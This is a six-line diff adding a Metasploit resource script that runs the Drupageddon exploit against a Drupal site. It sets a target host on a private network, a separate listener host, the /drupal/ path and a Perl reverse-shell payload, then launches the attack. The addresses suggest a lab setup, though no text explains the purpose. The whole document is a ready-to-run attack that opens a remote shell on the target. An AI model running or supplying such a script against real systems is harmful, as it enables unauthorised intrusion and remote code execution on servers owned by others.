@@ -1,0 +1,6 @@
+use exploit/multi/http/drupal_drupageddon
+set RHOSTS 192.168.100.86
+set LHOST 192.168.100.87
+set TARGETURI /drupal/
+set PAYLOAD php/reverse_perl
+exploit
